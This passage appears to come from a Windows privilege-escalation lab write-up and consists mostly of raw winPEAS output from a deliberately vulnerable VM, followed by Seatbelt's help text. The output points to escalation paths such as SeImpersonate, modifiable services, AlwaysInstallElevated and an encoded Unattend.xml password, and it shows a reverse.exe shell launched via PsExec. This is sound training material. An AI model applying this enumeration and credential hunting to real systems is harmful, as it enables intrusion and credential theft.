    No AV was detected!!
    Not Found

  [+] UAC Status(T1012)
   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access     
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 1.
      [+] Any local account can be used for lateral movement.                                  


  ===========================================(Users Information)===========================================                                                                                   

  [+] Users(T1087&T1069&T1033)
   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups                                             
  Current user: LOCAL SERVICE
  Current groups: Everyone, Builtin\Remote Desktop Users, Users, Service, Console Logon, Authenticated Users, This Organization, S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263, S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331, S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067
   =================================================================================================                                                                                          

    WIN-QBA94KB3IOF\admin
        |->Password: CanChange-Expi-Req

    WIN-QBA94KB3IOF\Administrator(Disabled): Built-in account for administering the computer/domain
        |->Password: CanChange-NotExpi-Req

    WIN-QBA94KB3IOF\DefaultAccount(Disabled): A user account managed by the system.
        |->Password: CanChange-NotExpi-NotReq

    WIN-QBA94KB3IOF\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Password: NotChange-NotExpi-NotReq

    WIN-QBA94KB3IOF\user
        |->Password: CanChange-Expi-Req

    WIN-QBA94KB3IOF\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-Expi-Req


  [+] Current Token privileges(T1134)
   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation                                 
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeSystemtimePrivilege: DISABLED
    SeShutdownPrivilege: DISABLED
    SeAuditPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED

  [+] Clipboard text(T1134)
    Not Found
    [i]     This C# implementation to capture the clipboard is not trustable in every Windows version                                                                                         
    [i]     If you want to see what is inside the clipboard execute 'powershell -command "Get - Clipboard"'                                                                                   

  [+] Logged users(T1087&T1033)
    WIN-QBA94KB3IOF\admin

  [+] RDP Sessions(T1087&T1033)
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    2         RDP-Tcp#1      admin          WIN-QBA94KB3IOF          Active    10.8.87.140

  [+] Ever logged users(T1087&T1033)
    WIN-QBA94KB3IOF\Administrator
    WIN-QBA94KB3IOF\admin
    WIN-QBA94KB3IOF\user

  [+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultUserName               :  admin

  [+] Home folders found(T1087&T1083&T1033)
    C:\Users\admin
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Service [WriteData/CreateFiles]
    C:\Users\user

  [+] Password Policies(T1201)
   [?] Check for a possible brute-force 
  [X] Exception: System.OverflowException: Negating the minimum value of a twos complement number is invalid.                                                                                 
   at System.TimeSpan.op_UnaryNegation(TimeSpan t)                                             
   at d7.d()                                                                                   
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================                                                                                          



  =======================================(Processes Information)=======================================                                                                                       

  [+] Interesting Processes -non Microsoft-(T1010&T1057&T1007)
   [?] Check if any interesting proccesses for memmory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes                                                                                           
    conhost(976)[C:\Windows\system32\conhost.exe] -- POwn: LOCAL SERVICE
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================                                                                                          

    explorer(3904)[C:\Windows\Explorer.EXE]
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================                                                                                          

    taskhostw(4884)[C:\Windows\system32\taskhostw.exe]
    Command Line: taskhostw.exe
   =================================================================================================                                                                                          

    sihost(3504)[C:\Windows\system32\sihost.exe]
    Command Line: sihost.exe
   =================================================================================================                                                                                          

    taskhostw(3488)[C:\Windows\system32\taskhostw.exe]
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================                                                                                          

    SearchUI(3484)[C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe]
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca                                 
   =================================================================================================                                                                                          

    ctfmon(3680)[C:\Windows\system32\ctfmon.exe]
    Command Line: "ctfmon.exe"
   =================================================================================================                                                                                          

    cmd(2512)[C:\Windows\system32\cmd.exe] -- POwn: LOCAL SERVICE
    Command Line: cmd
   =================================================================================================                                                                                          

    PsExec64(4692)[C:\PrivEsc\PsExec64.exe]
    Possible DLL Hijacking folder: C:\PrivEsc (Users [AppendData/CreateDirectories WriteData/CreateFiles])                                                                                    
    Command Line: C:\PrivEsc\PSExec64.exe  -i -u "nt authority\local service" C:\PrivEsc\reverse.exe                                                                                          
   =================================================================================================                                                                                          

    ServerManager(4252)[C:\Windows\system32\ServerManager.exe]
    Command Line: "C:\Windows\system32\ServerManager.exe" 
   =================================================================================================                                                                                          

    ShellExperienceHost(3244)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe]                                                                                
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca                                  
   =================================================================================================                                                                                          

    taskhostw(2060)[C:\Windows\system32\taskhostw.exe]
    Command Line: taskhostw.exe
   =================================================================================================                                                                                          

    rdpclip(3436)[C:\Windows\System32\rdpclip.exe]
    Command Line: rdpclip
   =================================================================================================                                                                                          

    reverse(4560)[C:\PrivEsc\reverse.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\PrivEsc (Users [AppendData/CreateDirectories WriteData/CreateFiles])                                                                                    
    Command Line: "C:\PrivEsc\reverse.exe" 
   =================================================================================================                                                                                          

    conhost(4164)[C:\Windows\system32\conhost.exe]
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================                                                                                          

    winPEASany(4748)[C:\PrivEsc\winPEASany.exe] -- POwn: LOCAL SERVICE -- isDotNet
    Possible DLL Hijacking folder: C:\PrivEsc (Users [AppendData/CreateDirectories WriteData/CreateFiles])                                                                                    
    Command Line: winPEASany.exe
   =================================================================================================                                                                                          

    cmd(4152)[C:\Windows\system32\cmd.exe]
    Command Line: "C:\Windows\system32\cmd.exe" 
   =================================================================================================                                                                                          



  ========================================(Services Information)========================================                                                                                      

  [+] Interesting Services -non Microsoft-(T1007)
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                              
    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent
   =================================================================================================                                                                                          

    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected                                          
    AWS Lite Guest Agent
   =================================================================================================                                                                                          

    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
   =================================================================================================                                                                                          

    dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Stopped
   =================================================================================================                                                                                          

    filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped                                                                 
    File Permissions: Everyone [AllAccess]
   =================================================================================================                                                                                          

    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
   =================================================================================================                                                                                          

    regsvc(Insecure Registry Service)["C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"] - Manual - Stopped                                                            
   =================================================================================================                                                                                          

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================                                                                                          

    unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected                         
   =================================================================================================                                                                                          

    winexesvc(winexesvc)[winexesvc.exe] - Manual - Stopped
   =================================================================================================                                                                                          

    PSEXESVC(Sysinternals - PSEXESVC)[C:\Windows\PSEXESVC.exe] - Manual - Running
   =================================================================================================                                                                                          


  [+] Modifiable Services(T1007)
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                    
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles
    UsoSvc: AllAccess, Start

  [+] Looking if you can modify any service registry()
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions                                 
    [-] Looks like you cannot change the registry of any service...

  [+] Checking write permissions in PATH folders (DLL Hijacking)()
   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking                                                           
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps
    
    (DLL Hijacking) C:\Temp: Users [AppendData/CreateDirectories WriteData/CreateFiles]


  ====================================(Applications Information)====================================                                                                                          

  [+] Current Active Window Application(T1010&T1518)
    \\WIN-QBA94KB3IOF: C:\PrivEsc\reverse.exe 
    Possible DLL Hijacking, folder is writable: C:\PrivEsc
    FolderPermissions: 

  [+] Installed Applications --Via Program Files/Uninstall registry--(T1083&T1012&T1010&T1518)
   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software                                                             
    C:\Program Files\Amazon
    C:\Program Files\Autorun Program
    C:\Program Files\Common Files
    C:\Program Files\DACL Service
    C:\Program Files\desktop.ini
    C:\Program Files\DLL Hijack Service
    C:\Program Files\File Permissions Service
    C:\Program Files\Insecure Registry Service
    C:\Program Files\internet explorer
    C:\Program Files\Uninstall Information
    C:\Program Files\Unquoted Path Service(Users [AllAccess])
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


  [+] Autorun Applications(T1010)
   [?] Check if you can modify other users AutoRuns binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup                                            
System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.              
   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)                      
   at System.IO.FileSystemEnumerableIterator`1.CommonInit()                                    
   at System.IO.FileSystemEnumerableIterator`1..ctor(String path, String originalUserPath, String searchPattern, SearchOption searchOption, SearchResultHandler`1 resultHandler, Boolean checkHost)                                                                                          
   at System.IO.Directory.GetFiles(String path, String searchPattern, SearchOption searchOption)                                                                                              
   at dx.b()                                                                                   
   at dx.a(Dictionary`2 A_0)                                                                   
   at d4.ap()                                                                                  

  [+] Scheduled Applications --Non Microsoft--(T1010)
   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup                                           
System.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233' or one of its dependencies. The system cannot find the file specified.                                                  
File name: 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233'                                                                                
   at dx.a()                                                                                   
   at d4.ao()                                                                                  
                                                                                               
WRN: Assembly binding logging is turned OFF.                                                   
To enable assembly bind failure logging, set the registry value [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) to 1.                                                                      
Note: There is some performance penalty associated with assembly bind failure logging.         
To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fusion!EnableLog].
                                                                                               


  =========================================(Network Information)=========================================                                                                                     

  [+] Network Shares(T1135)
  [X] Exception: System.Runtime.InteropServices.COMException (0x80070006): The handle is invalid. (Exception from HRESULT: 0x80070006 (E_HANDLE))                                             
   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)                                                                                   
   at System.Runtime.InteropServices.Marshal.FreeHGlobal(IntPtr hglobal)                       
   at winPEAS.SamServer.c.d(Boolean A_0)                                                       
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

  [+] Host File(T1016)

  [+] Network Ifaces and known hosts(T1016)
   [?] The masks are only for the IPv4 addresses 
    Ethernet[02:CC:3E:7D:12:83]: 10.10.228.177, fe80::445b:69c5:a7e7:9955%15 / 255.255.0.0
        Gateways: 10.10.0.1
        DNSs: 10.0.0.2
        Known hosts:
          10.10.0.1             02-C8-85-B5-5A-AA     Dynamic
          10.10.255.255         FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


  [+] Current Listening Ports(T1049&T1049)
   [?] Check for services restricted from the outside 
    Proto     Local Address          Foreing Address        State
    TCP       0.0.0.0:135                                   Listening
    TCP       0.0.0.0:445                                   Listening
    TCP       0.0.0.0:3389                                  Listening
    TCP       0.0.0.0:5985                                  Listening
    TCP       0.0.0.0:47001                                 Listening
    TCP       0.0.0.0:49664                                 Listening
    TCP       0.0.0.0:49665                                 Listening
    TCP       0.0.0.0:49666                                 Listening
    TCP       0.0.0.0:49667                                 Listening
    TCP       0.0.0.0:49668                                 Listening
    TCP       0.0.0.0:49669                                 Listening
    TCP       0.0.0.0:49670                                 Listening
    TCP       10.10.228.177:139                             Listening
    TCP       [::]:135                                      Listening
    TCP       [::]:445                                      Listening
    TCP       [::]:3389                                     Listening
    TCP       [::]:5985                                     Listening
    TCP       [::]:47001                                    Listening
    TCP       [::]:49664                                    Listening
    TCP       [::]:49665                                    Listening
    TCP       [::]:49666                                    Listening
    TCP       [::]:49667                                    Listening
    TCP       [::]:49668                                    Listening
    TCP       [::]:49669                                    Listening
    TCP       [::]:49670                                    Listening
    UDP       0.0.0.0:123                                   Listening
    UDP       0.0.0.0:500                                   Listening
    UDP       0.0.0.0:3389                                  Listening
    UDP       0.0.0.0:4500                                  Listening
    UDP       0.0.0.0:5353                                  Listening
    UDP       0.0.0.0:5355                                  Listening
    UDP       10.10.228.177:137                             Listening
    UDP       10.10.228.177:138                             Listening
    UDP       127.0.0.1:52796                               Listening
    UDP       127.0.0.1:62556                               Listening
    UDP       [::]:123                                      Listening
    UDP       [::]:500                                      Listening

  [+] Firewall Rules(T1016)
   [?] Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    False
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

  [+] DNS cached --limit 70--(T1016)
    Entry                                 Name                                  Data
    sls.update.microsoft.com              sls.update.microsoft.com              ....update.microsoft.com.akadns.net
    sls.update.microsoft.com              ....update.microsoft.com.akadns.net   ....update.microsoft.com.akadns.net
    sls.update.microsoft.com              ....update.microsoft.com.akadns.net   40.125.122.176


  =========================================(Windows Credentials)=========================================                                                                                     

  [+] Checking Windows Vault()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                              
    Not Found

  [+] Checking Credential manager()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                              
    This function is not yet implemented.
    [i] If you want to list credentials inside Credential Manager use 'cmdkey /list'

  [+] Saved RDP connections()
    Not Found

  [+] Recently run commands()
    Not Found

  [+] Checking for DPAPI Master Keys()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    Not Found

  [+] Checking for Credential Files()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    CredFile: C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: 689c8434-314a-4735-adb1-089390a87033
    Accessed: 6/4/2020 6:12:03 PM
    Modified: 6/4/2020 6:12:03 PM
    Size: 11152
   =================================================================================================                                                                                          

    [i] Follow the provided link for further instructions in how to decrypt the creds file

  [+] Checking for RDCMan Settings Files()
   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager                       
    Not Found

  [+] Looking for kerberos tickets()
   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

  [+] Looking saved Wifis()
    This function is not yet implemented.
    [i] If you want to list saved Wifis connections you can list the using 'netsh wlan show profile'                                                                                          
    [i] If you want to get the clear-text password use 'netsh wlan show profile <SSID> key=clear'                                                                                             

  [+] Looking AppCmd.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    Not Found

  [+] Looking SSClient.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
    Not Found

  [+] Checking AlwaysInstallElevated(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated                                                                                          
    AlwaysInstallElevated set to 1 in HKLM!

  [+] Checking WSUS(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found


  ========================================(Browsers Information)========================================                                                                                      

  [+] Looking for Firefox DBs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Firefox history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for Chrome DBs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Chrome history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Chrome bookmarks(T1217)
    Not Found

  [+] Current IE tabs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))                                                     
   --- End of inner exception stack trace ---                                                  
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)              
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                                                                                 
   at d0.s()                                                                                   
    Not Found

  [+] Looking for GET credentials in IE history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history

  [+] IE favorites(T1217)
    Not Found


  ==============================(Interesting files and registry)==============================

  [+] Putty Sessions()
    Not Found

  [+] Putty SSH Host keys()
    Not Found

  [+] SSH keys in registry()
   [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry            
    Not Found

  [+] Cloud Credentials(T1538&T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files                                                                                       
    Not Found

  [+] Unnattend Files()
    C:\Windows\Panther\Unattend.xml
<Password>                    <Value>cGFzc3dvcmQxMjM=</Value>                    <PlainText>false</PlainText>                </Password>

  [+] Looking for common SAM & SYSTEM backups()
    C:\Windows\repair\SAM
    C:\Windows\repair\SYSTEM

  [+] Looking for McAfee Sitelist.xml Files()

  [+] Cached GPP Passwords()
  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.

  [+] Looking for possible regs with creds(T1012&T1214)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry                                                                                            
    Not Found
    Not Found
    Not Found
    Not Found

  [+] Looking for possible password files in users homes(T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files                                                                                       
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

  [+] Looking inside the Recycle Bin for creds files(T1083&T1081&T1145)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files                                                                                       
    Not Found

  [+] Searching known files that can contain creds in home(T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files                                                                                       

  [+] Looking for documents --limit 100--(T1083)
    Not Found

  [+] Recent files --limit 70--(T1083&T1081)
    Not Found
```

#### Seatbelt.exe

```
C:\PrivEsc>Seatbelt.exe
Seatbelt.exe


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


 "SeatBelt.exe system" collects the following system data:

        BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)
        RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13
        TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)
        UACSystemPolicies     -   UAC system policies via the registry
        PowerShellSettings    -   PowerShell versions and security settings
        AuditSettings         -   Audit settings via the registry
        WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry
        LSASettings           -   LSA settings (including auth packages)
        UserEnvVariables      -   Current user environment variables
        SystemEnvVariables    -   Current system environment variables
        UserFolders           -   Folders in C:\Users\
        NonstandardServices   -   Services with file info company names that don't contain 'Microsoft'
        InternetSettings      -   Internet settings including proxy configs
        LapsSettings          -   LAPS settings, if installed
        LocalGroupMembers     -   Members of local admins, RDP, and DCOM
        MappedDrives          -   Mapped drives
        RDPSessions           -   Current incoming RDP sessions
        WMIMappedDrives       -   Mapped drives via WMI
        NetworkShares         -   Network shares
        FirewallRules         -   Deny firewall rules, "full" dumps all
        AntiVirusWMI          -   Registered antivirus (via WMI)
        InterestingProcesses  -   "Interesting" processes- defensive products and admin tools
        RegistryAutoRuns      -   Registry autoruns
        RegistryAutoLogon     -   Registry autologon information
        DNSCache              -   DNS cache entries (via WMI)
        ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)
        AllTcpConnections     -   Lists current TCP connections and associated processes
        AllUdpConnections     -   Lists current UDP connections and associated processes
        NonstandardProcesses  -   Running processeswith file info company names that don't contain 'Microsoft'
         *  If the user is in high integrity, the following additional actions are run:
        SysmonConfig          -   Sysmon configuration from the registry


 "SeatBelt.exe user" collects the following user data:

        SavedRDPConnections   -   Saved RDP connections
        TriageIE              -   Internet Explorer bookmarks and history  (last 7 days)
        DumpVault             -   Dump saved credentials in Windows Vault (i.e. logins from Internet Explorer and Edge), from SharpWeb
        RecentRunCommands     -   Recent "run" commands
        PuttySessions         -   Interesting settings from any saved Putty configurations
        PuttySSHHostKeys      -   Saved putty SSH host keys
        CloudCreds            -   AWS/Google/Azure cloud credential files
        RecentFiles           -   Parsed "recent files" shortcuts  (last 7 days)
        MasterKeys            -   List DPAPI master keys
        CredFiles             -   List Windows credential DPAPI blobs
        RDCManFiles           -   List Windows Remote Desktop Connection Manager settings files
         *  If the user is in high integrity, this data is collected for ALL users instead of just the current user


 Non-default options:

        CurrentDomainGroups   -   The current user's local and domain groups
        Patches               -   Installed patches via WMI (takes a bit on some systems)
        LogonSessions         -   User logon session data
        KerberosTGTData       -   ALL TEH TGTZ!
        InterestingFiles      -   "Interesting" files matching various patterns in the user's folder
        IETabs                -   Open Internet Explorer tabs
        TriageChrome          -   Chrome bookmarks and history
        TriageFirefox         -   Firefox history (no bookmarks)
        RecycleBin            -   Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
        4624Events            -   4624 logon events from the security event log
        4648Events            -   4648 explicit logon events from the security event log (runas or outbound RDP)
        KerberosTickets       -   List Kerberos tickets. If elevated, grouped by all logon sessions.


 "SeatBelt.exe all" will run ALL enumeration checks, can be combined with "full".


 "SeatBelt.exe [CheckName] full" will prevent any filtering and will return complete results.


 "SeatBelt.exe [CheckName] [CheckName2] ..." will run one or more specified checks only (case-sensitive naming!)

Seatbelt has the following command groups: All, User, System, Slack, Chromium, Remote, Misc

    You can invoke command groups with "Seatbelt.exe <group>"

   "Seatbelt.exe -group=all" runs all commands

   "Seatbelt.exe -group=user" runs the following commands:

        ChromiumPresence, CloudCredentials, CredEnum, dir, DpapiMasterKeys, 
        ExplorerMRUs, ExplorerRunCommands, FileZilla, FirefoxPresence, 
        IdleTime, IEFavorites, IETabs, IEUrls, 
        MappedDrives, OfficeMRUs, OracleSQLDeveloper, PowerShellHistory, 
        PuttyHostKeys, PuttySessions, RDCManFiles, RDPSavedConnections, 
        SecPackageCreds, SlackDownloads, SlackPresence, SlackWorkspaces, 
        SuperPutty, TokenGroups, WindowsCredentialFiles, WindowsVault
        

   "Seatbelt.exe -group=system" runs the following commands:

        AMSIProviders, AntiVirus, AppLocker, ARPTable, AuditPolicies, 
        AuditPolicyRegistry, AutoRuns, CredGuard, DNSCache, 
        DotNet, EnvironmentPath, EnvironmentVariables, Hotfixes, 
        InterestingProcesses, InternetSettings, LAPS, LastShutdown, 
        LocalGPOs, LocalGroups, LocalUsers, LogonSessions, 
        LSASettings, McAfeeConfigs, NamedPipes, NetworkProfiles, 
        NetworkShares, NTLMSettings, OSInfo, PoweredOnEvents, 
        PowerShell, Processes, PSSessionSettings, RDPSessions, 
        RDPsettings, SCCM, Services, Sysmon, 
        TcpConnections, TokenPrivileges, UAC, UdpConnections, 
        UserRightAssignments, WindowsAutoLogon, WindowsDefender, WindowsEventForwarding, 
        WindowsFirewall, WMIEventConsumer, WMIEventFilter, WMIFilterBinding, 
        WSUS

   "Seatbelt.exe -group=slack" runs the following commands:

        SlackDownloads, SlackPresence, SlackWorkspaces

   "Seatbelt.exe -group=chromium" runs the following commands:

        ChromiumBookmarks, ChromiumHistory, ChromiumPresence

   "Seatbelt.exe -group=remote" runs the following commands:

        AMSIProviders, AntiVirus, AuditPolicyRegistry, ChromiumPresence, CloudCredentials, 
        DNSCache, DotNet, DpapiMasterKeys, EnvironmentVariables, 
        ExplicitLogonEvents, ExplorerRunCommands, FileZilla, Hotfixes, 
        InterestingProcesses, LastShutdown, LocalGroups, LocalUsers, 
        LogonEvents, LogonSessions, LSASettings, MappedDrives, 
        NetworkProfiles, NetworkShares, NTLMSettings, OSInfo, 
        PoweredOnEvents, PowerShell, ProcessOwners, PSSessionSettings, 
        PuttyHostKeys, PuttySessions, RDPSavedConnections, RDPSessions, 
        RDPsettings, Sysmon, WindowsDefender, WindowsEventForwarding, 
        WindowsFirewall

   "Seatbelt.exe -group=misc" runs the following commands:

